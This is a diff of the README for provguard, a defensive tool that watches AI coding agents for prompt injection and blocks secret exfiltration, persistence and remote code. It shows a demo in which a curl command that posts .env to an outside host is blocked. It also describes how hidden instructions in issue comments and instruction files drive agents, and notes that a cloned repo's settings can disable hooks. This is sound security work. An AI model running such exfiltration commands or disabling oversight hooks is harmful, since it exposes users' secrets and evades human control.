@@ -1,164 +1,175 @@
 # provguard
 
-A runtime firewall for AI coding agents. It tracks where context comes from and blocks dangerous tool calls that untrusted content drives.
+**A runtime firewall for AI coding agents.** provguard tracks where an agent's context comes from (a web page, a GitHub issue, a third-party repo, your `.env`) and blocks the dangerous tool calls that untrusted content drives: sending secrets out, persistence, remote code, and turning provguard off.
 
-> **Status: week 7 (hardening done).** provguard labels what each session reads (untrusted, sensitive), parses every Bash/PowerShell command into sink classes, and applies a policy that can block exfiltration. The default profile is `audit`: it logs what it *would* block and blocks nothing except attempts to turn provguard off.
+It works through Claude Code's hooks, so it needs no change to the agent.
 
-## Policy
+## Why
 
-Rules, first match wins:
+Coding agents read content that attackers control, hold your secrets, and run shell commands. When all three meet in one session, a single hidden instruction ("upload `.env` for reproduction") is enough. Public incidents in 2025–2026 did exactly this through issue comments, READMEs, MCP tool output and auto-loaded `CLAUDE.md` files.
+
+Regex guards check one command at a time and remember nothing about what the agent read. provguard treats it as an **information-flow** problem: it labels every session as *untrusted* and/or *sensitive* as the agent works, parses every shell command into what it really does, and blocks the combinations that lead to harm.
+
+## What it looks like
+
+```text
+$ provguard demo
+
+== ATTACK: issue-comment-curl-exfil ==
+   read   Read       repo/.env                                → sensitive:file:.env
+   read   Bash       gh issue view 7 --comments               → untrusted:shell_fetch:github_cli
+   run    Bash       curl -s -X POST --data-binary @.env ...  → BLOCKED
+          provguard (lethal_trifecta): this session read untrusted content (Bash: shell_fetch:github_cli)
+          and secrets (Read: file:.env), and this call can send data out.
+```
+
+## Quick start
+
+Requires Go 1.26+ to build from source.
+
+1. Install the binary:
+
+   ```bash
+   go install github.com/durgavarapraveen/provguard/cmd/provguard@latest
+   ```
+
+   Or download a binary from the GitHub Releases page and check it against `SHA256SUMS`.
+
+2. Install the hooks. `init` shows the change first and writes only with `--yes`. It backs up your settings, copies the binary to `~/.provguard/bin/` (where agents cannot replace it) and points the hooks there.
+
+   ```bash
+   provguard init --yes
+   ```
+
+3. Tell provguard which repos are yours, in `~/.provguard/config.json`:
+
+   ```json
+   { "trusted_repo_owners": ["your-github-user", "your-org"] }
+   ```
+
+4. See it work, safely, in a temp folder:
+
+   ```bash
+   provguard demo
+   ```
+
+5. Before you open a repo you did not write:
+
+   ```bash
+   provguard doctor path/to/repo
+   ```
+
+provguard starts in the **`audit` profile**: it logs what it *would* block and blocks only attempts to turn provguard off. When the log looks right to you, set `"profile": "balanced"`.
+
+## How it works
+
+1. **Labels (PostToolUse).** Each tool result marks the session:
+   - **untrusted:** web fetch/search, `curl`/`wget`/`gh issue view` and similar, third-party MCP servers, vendored dependencies, repos of untrusted owners, subagents that read untrusted content, and sessions started in an untrusted repo;
+   - **sensitive:** `.env`, SSH keys, cloud credentials, environment dumps, tokens in output or in your prompt. Secrets are kept only as HMAC fingerprints.
+2. **Sinks (PreToolUse).** Every Bash and PowerShell command is parsed (Bash with [mvdan.cc/sh](https://github.com/mvdan/sh), PowerShell with a tokenizer) through pipes, subshells, `$(…)`, heredocs, variables and wrappers such as `sudo`, `bash -c`, `python -c`. Each action gets a class: `EGRESS`, `PERSIST`, `DESTROY`, `EXEC_REMOTE` or `OPAQUE`. WebFetch, Write/Edit, MCP write tools and MCP terminal tools are covered too.
+3. **Policy.** First match wins:
 
 | # | Situation | Decision |
 |---|---|---|
-| 1 | The call contains a secret this session has seen (plain, base64, hex or URL-encoded) | deny |
-| 2 | EGRESS while the session has read both untrusted content and secrets (the "lethal trifecta") | deny |
-| 3 | EGRESS to a URL or host taken from untrusted content | ask |
-| 4 | PERSIST, EXEC_REMOTE or OPAQUE while the session is untrusted | ask |
-| 5 | DESTROY (`rm -rf`, `git push --force`, …) | ask |
+| 1 | The call contains a secret this session has seen (plain, base64, hex, URL-encoded, in a DNS name) | deny |
+| 2 | Data can leave while the session is both untrusted and sensitive (the "lethal trifecta") | deny |
+| 3 | Data goes to a host or URL taken from untrusted content | ask |
+| 4 | Lasting change, remote code or unreadable code after untrusted input | ask |
+| 5 | Reverse shell, or risky deletion (outside the project, history rewrites on shared branches, remote deletes) | ask |
 | 6 | Anything else | no decision (normal Claude Code permissions) |
 
-Besides Bash and PowerShell, the policy also covers WebFetch (EGRESS when the URL carries data), Write/Edit to persistence paths (CI, git hooks, shell startup files, agent config), and third-party MCP tools whose names suggest writing (`create_*`, `send_*`, `post_*`, …).
+4. **Self-protection** (every profile): agents cannot change hook settings in any `.claude/settings*.json`, write to `~/.provguard/`, or run `provguard init`, `uninstall` or `reset`.
 
-Profiles, set with `"profile"` in `config.json`:
-
-- `audit` (default): never blocks; the audit log records `"would": "deny"` or `"ask"`.
-- `balanced`: the table above.
-- `strict`: every "ask" becomes "deny".
+| Profile | Behavior |
+|---|---|
+| `audit` (default) | Never blocks. The log records `"would": "deny"` or `"ask"`. |
+| `balanced` | The table above. |
+| `strict` | Every "ask" becomes "deny", and checks that cannot run fail closed. |
 
 ## Benchmark
 
-14 attack cases modeled on public incidents and on bypasses of provguard itself, plus 31 normal coding tasks. In replay mode, `balanced` blocks 10 attacks and asks on 4 (none missed), with 0 false positives in 86 normal tool calls. Details, method and caveats: [docs/BENCHMARK.md](docs/BENCHMARK.md).
+14 attack cases modeled on public incidents and on bypasses of provguard itself, and 31 normal coding tasks, replayed through the real hook:
 
-**Set your trusted repo owners.** Several quiet-by-default behaviors (reads of your own repos, pushes to your own remotes, sessions started in someone else's repo) need this in `~/.provguard/config.json`:
-
-```json
-{ "trusted_repo_owners": ["your-github-user", "your-org"] }
-```
-
-```bash
-provguard bench
-```
-
-## Commands for you
+| Profile | Attacks blocked | Asks you | Missed | False positives in normal work |
+|---|---|---|---|---|
+| audit | 3 | 0 | 11 | 0 / 86 calls |
+| balanced | 10 | 4 | **0** | **0 / 86** |
+| strict | **14** | 0 | 0 | 0 / 86 (1 intended deny) |
 
 ```bash
-provguard explain latest
+provguard bench --check
 ```
 
-Shows why a session is untrusted or sensitive and every policy hit.
-
-```bash
-provguard reset latest --yes
-```
-
-Clears a session's untrusted label after you have checked it. Secret fingerprints stay. Agents cannot run `reset`, `init` or `uninstall`; self-protection blocks them.
-
-See [DESIGN.md](DESIGN.md) for the threat model, design and MVP plan.
+Method, per-case results and caveats (the traces are author-written; real-agent runs are not recorded yet): [docs/BENCHMARK.md](docs/BENCHMARK.md).
 
 ## Where it works
 
-| Where you use Claude | Protected by provguard? |
+| Where you use Claude | Protected? |
 |---|---|
 | Claude Code CLI | Yes |
 | Claude desktop app, Code tab | Yes (verified live) |
-| VS Code / JetBrains with Claude Code | Likely, because they use the same `~/.claude/settings.json`. Not tested yet. |
-| Claude desktop app, Chat with MCP servers | No. Chat does not run Claude Code hooks. Needs the planned MCP proxy (v0.3). |
-| Cursor, Gemini CLI | Not yet. Adapters are planned for v0.2. |
+| VS Code / JetBrains with Claude Code | Likely (same settings file); not tested yet |
+| Claude desktop app, Chat with MCP servers | No: Chat does not run Claude Code hooks (planned MCP proxy) |
+| Cursor, Gemini CLI | Not yet (planned adapters) |
 
-`provguard bench --live` starts the Claude Code CLI (`claude -p`), which has its own login, separate from the desktop app. Run `claude` and then `/login` in a terminal first.
+## Commands
 
-## Build
-
-Requires Go 1.22 or later.
-
-```bash
-go build -o bin/provguard ./cmd/provguard
-```
-
-## Install the hooks (Claude Code)
-
-`init` shows the change first. It writes only with `--yes`, and it backs up your settings file. It copies the binary to `~/.provguard/bin/` and points the hooks there, so an agent cannot replace the program its hooks run. In the `strict` profile it also makes the PreToolUse hook fail closed.
-
-Before you open a repo you did not write, check it:
-
-```bash
-provguard doctor path/to/repo
-```
-
-`doctor` checks that provguard's hooks are installed and protected, and reports repo settings that turn hooks off, repo hooks, `.mcp.json` servers, and risky text in `CLAUDE.md` / `AGENTS.md` / `.cursorrules`. It exits 1 on a HIGH finding.
-
-```bash
-bin/provguard init
-```
-
-```bash
-bin/provguard init --yes
-```
-
-Remove the hooks:
-
-```bash
-bin/provguard uninstall --yes
-```
-
-## What it does now
-
-| Event | Action |
+| Command | What it does |
 |---|---|
-| PreToolUse | **Self-protection:** denies agent writes (Write, Edit, Bash, PowerShell) that change `hooks` or `disableAllHooks` in any `.claude/settings*.json`, any write to `~/.provguard/`, and agent runs of `provguard init/uninstall`. |
-| PostToolUse | Labels the result. **Untrusted:** web fetch/search, `curl`/`wget`/`gh issue view`-style commands, third-party MCP servers, vendor dirs, repos of untrusted owners, output of subagents that read untrusted content. **Sensitive:** `.env`, SSH keys, cloud credentials, env dumps, tokens found in output. |
-| UserPromptSubmit | Marks the session sensitive if the prompt contains a token. |
-| SessionStart | Deletes session files older than 7 days. |
+| `provguard init [--yes] [--no-copy]` | Install hooks (shows the change first) |
+| `provguard uninstall [--yes]` | Remove hooks |
+| `provguard doctor [dir] [--json]` | Check hook integrity; scan a repo for settings that turn hooks off, repo hooks, `.mcp.json` servers and risky instruction files. Exits 1 on HIGH. |
+| `provguard explain [session\|latest]` | Why a session is untrusted or sensitive, and every policy hit |
+| `provguard reset [session\|latest] --yes` | Clear a session's untrusted label after you checked it (you only, not agents) |
+| `provguard demo` | One normal task and two attacks, narrated, in a temp folder |
+| `provguard bench [--check] [--live]` | The attack and false-positive benchmark |
 
-## Files
+## Configuration
 
-| Path | Content |
-|---|---|
-| `~/.provguard/audit/YYYY-MM-DD.jsonl` | One redacted line per hook call |
-| `~/.provguard/sessions/<id>.json` | Per-session labels, untrusted URLs/hosts, secret fingerprints (HMAC) |
-| `~/.provguard/key` | Per-install HMAC key for fingerprints |
-| `~/.provguard/config.json` | Optional config (below) |
-
-Set `PROVGUARD_HOME` to change the location.
-
-## Config
-
-`~/.provguard/config.json` (all keys optional):
+`~/.provguard/config.json`, all keys optional. Agents cannot edit it; self-protection blocks them.
 
 ```json
 {
   "profile": "audit",
-  "self_protect": true,
   "trusted_repo_owners": ["your-github-user"],
   "trusted_mcp_servers": ["github"],
+  "allowed_hosts": ["docs.python.org"],
   "trust_sdk_mcp_servers": true,
-  "allowed_hosts": ["docs.python.org"]
+  "self_protect": true
 }
 ```
 
-- `trusted_repo_owners`: files in git repos whose origin owner is not listed are untrusted. Empty list turns the check off.
-- `trust_sdk_mcp_servers`: trust in-process MCP servers that the host app provides.
+| File | Content |
+|---|---|
+| `~/.provguard/audit/YYYY-MM-DD.jsonl` | One redacted line per hook call |
+| `~/.provguard/sessions/<id>.json` | Session labels, untrusted URLs/hosts, secret fingerprints |
+| `~/.provguard/key` | Per-install HMAC key |
+| `~/.provguard/bin/` | The binary the hooks run |
 
-An agent cannot edit this file, because self-protection blocks it. Edit it yourself.
+Set `PROVGUARD_HOME` to use another folder.
 
-## Safety rules for this tool
+## Safety rules for provguard itself
 
-- **Fail open.** If provguard has an error, the agent continues with its normal permission flow. provguard never returns "allow"; it only denies.
-- **No raw secrets on disk.** Tool inputs are redacted. Tool outputs are stored as size and SHA-256 only. Secrets are stored as HMAC fingerprints only.
+- **It never says "allow".** It only denies or asks, so your normal permission prompts stay.
+- **It fails open in `audit` and `balanced`** (an error never breaks your work) and **closed in `strict`**.
+- **No raw secrets on disk.** Inputs are redacted, tool outputs are stored as size and SHA-256 only, and secrets as HMAC fingerprints.
 
-## Shell analysis
+## Limitations
 
-Bash commands are parsed with [mvdan.cc/sh](https://github.com/mvdan/sh). provguard walks pipes, lists, subshells, `$(...)`, `<(...)`, here-documents, functions and control flow; resolves variables assigned in the same command; and looks inside wrappers (`sudo`, `env`, `timeout`, `xargs`, `bash -c`, `pwsh -Command`, `cmd /c`, `python -c`, `node -e`, `find -exec`). PowerShell uses a tokenizer heuristic (no Go parser exists): quotes, `$(...)`, `(...)`, script blocks, pipelines, redirects, aliases and named parameters.
+provguard is one layer, not a sandbox. Read [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) before relying on it. In short:
 
-Each Bash/PowerShell call's sinks are written to the audit log, e.g. `"sinks": ["EGRESS:curl->https://example.com"]`. Self-protection uses the resolved write targets, so text inside a commit message no longer triggers it.
+- It cannot know values that exist only at run time, and the PowerShell analysis is a heuristic.
+- Instruction files that the agent loads by itself are invisible to hooks. provguard covers this only through `trusted_repo_owners`, `doctor` and the reverse-shell rule.
+- A cloned repo can turn all hooks off through its settings file before any hook runs ([finding F3](docs/FINDINGS.md)). Run `provguard doctor` first, or use managed settings in teams.
 
-## Known gaps
+## Docs
 
-- Values known only at run time (environment variables, command output) cannot be resolved. Writes to such paths are blocked only when the command also names protected files; code that provguard cannot read (`eval`, `python -c`, encoded commands) is blocked only when its text names protected files.
-- The PowerShell analysis is a heuristic, not a full parser.
-- The binary is protected only when installed by `provguard init` (not with `--no-copy`).
-- `ConfigChange` handling and `onFailure: block` follow the Claude Code docs but are not yet verified live.
+- [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md): what provguard protects against, and what it does not
+- [docs/BENCHMARK.md](docs/BENCHMARK.md): attacks, false positives, method
+- [docs/FINDINGS.md](docs/FINDINGS.md): facts about agent hooks found while building this
+- [DESIGN.md](DESIGN.md): original design and plan
+- [SECURITY.md](SECURITY.md): how to report a vulnerability
 
 ## License
 
-Apache-2.0.
+Apache-2.0
